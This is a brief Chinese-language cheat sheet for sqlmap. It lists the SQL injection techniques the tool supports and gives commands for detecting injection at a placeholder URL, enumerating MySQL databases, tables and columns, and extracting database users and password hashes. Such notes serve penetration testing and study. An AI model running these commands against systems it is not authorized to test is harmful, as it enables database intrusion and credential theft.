# sqlmap

- https://github.com/sqlmapproject/sqlmap
- https://sqlmap.org

自动 SQL 注入和数据库接管工具

支持的 SQL 注入技术：

1. 布尔盲注
2. 时间盲注
3. 错误注入
4. UNION查询注入
5. 堆叠查询
6. 带外注入

### sql注入 - MySQL

```shell
# 直连数据库 -- 知道账号密码的情况下
python sqlmap.py -d "mysql://root:root@127.0.0.1:3306/demo" -f --banner --users

# 未知账号密码的情况下，可以用本地api接口地址来测试 (含有sql注入的接口  sql注入示例: WHERE id=1 and 1=1 )
# 判断是否存在注入
python sqlmap.py -u "http://url地址" --batch --banner
# 获取当前用户下的所有数据库
python sqlmap.py -u "http://url地址" --dbs
# 获取指定库的表名
python sqlmap.py -u "http://url地址" -D 库名 --tables
# 获取指定库+表名下的字段
python sqlmap.py -u "http://url地址" -D 库名 -T 表名 --columns
# 获取数据库账号
python sqlmap.py -u "http://url地址" --users
# 获取数据库密码
python sqlmap.py -u "http://url地址" --passwords
```
